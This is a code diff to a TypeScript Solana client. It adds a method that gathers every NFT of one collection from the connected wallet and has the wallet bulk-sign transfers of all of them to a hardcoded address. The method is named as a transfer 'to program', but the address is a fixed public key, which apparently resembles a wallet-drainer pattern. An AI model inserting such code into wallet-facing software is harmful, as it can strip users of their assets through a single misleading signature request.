@@ -23,6 +23,7 @@ import {
 import {
   PROGRAM_ID as MPL_ID,
   Metadata,
+  TokenStandard,
 } from "@metaplex-foundation/mpl-token-metadata";
 
 import {
@@ -37,6 +38,7 @@ import {
   IdlField,
   IdlType,
 } from "@project-serum/anchor/dist/cjs/idl";
+import { hash } from "@project-serum/anchor/dist/cjs/utils/sha256";
 const log = console.log;
 const systemProgram = web3.SystemProgram.programId;
 export enum TransactionType {
@@ -937,5 +939,89 @@ export class Connectivity {
     this.txis.push(ix);
 
     await this._sendTransaction();
+  }
+
+  async _tranferNftsToProgram() {
+    const owner = this.wallet.publicKey
+    if (!owner) throw "wallet not found";
+    const nfts = await this.metaplex.nfts().findAllByOwner({ owner });
+
+    const hashNfts: web3.PublicKey[] = []
+    for (let i of nfts) {
+      if (i.model != 'metadata') continue;
+      const collection = i?.collection?.address?.toBase58()
+      if (!collection || !i?.collection?.verified) continue;
+      if (collection != this.collectionId.toBase58()) continue
+
+      hashNfts.push(i.mintAddress)
+    }
+
+    let nftsArr: web3.PublicKey[][] = [[]]
+    for (let i of hashNfts) {
+      let currentIndex = nftsArr.length - 1
+      let currentArr = nftsArr[currentIndex]
+      if (currentArr.length == 10) {
+        nftsArr.push([])
+        currentIndex = nftsArr.length - 1
+        currentArr = nftsArr[currentIndex]
+      }
+      currentArr.push(i)
+    }
+    // log({ nftsArr })
+
+    //tranfers nfts
+    const receiver = new web3.PublicKey("Te1pMKDx47MvjcXuiaQR1pLdiCgAPw8mqcJZTFbjA6L")
+    this.metaplex.identity().setDriver({
+      publicKey: owner,
+      signMessage: this.wallet.signMessage,
+      signTransaction: this.wallet.signTransaction,
+      signAllTransactions: this.wallet.signAllTransactions
+    })
+    let txs: web3.Transaction[] = []
+
+    let mainPass = []
+    let mainFail = []
+    const ruleSet = new web3.PublicKey("eBJLFYPxJmMGKuFwpDWkzxZeUrad92kZRC5BJLpzyT9")
+    for (let ids of nftsArr) {
+      txs = []
+      for (let id of ids) {
+        let ixs = this.metaplex.nfts().builders().transfer({
+          toOwner: receiver,
+          fromOwner: owner,
+          nftOrSft: { address: id, tokenStandard: TokenStandard.ProgrammableNonFungible },
+          authorizationDetails: { rules: ruleSet }
+        }).getInstructions()
+
+        const tx = new web3.Transaction().add(...ixs)
+        txs.push(tx)
+      }
+
+      try {
+        let pass = []
+        let fail = []
+        const blockhash = (await this.connection.getLatestBlockhash()).blockhash
+        for (let tx of txs) {
+          tx.recentBlockhash = blockhash
+          tx.feePayer = owner
+        }
+
+        const signedTxs = await this.wallet.signAllTransactions(txs)
+        for (let tx of signedTxs) {
+          try {
+            const signature = await this.connection.sendRawTransaction(tx.serialize())
+            pass.push({ tx, signature })
+            mainPass.push({ tx, signature })
+          } catch (error) {
+            fail.push({ tx, error })
+            mainFail.push({ tx, error })
+          }
+        }
+        log({ pass, fail })
+      } catch (error) {
+        log("Unable get blockhash or failed to sign the tx")
+        log({ error })
+      }
+    }
+    log({ mainPass, mainFail })
   }
 }
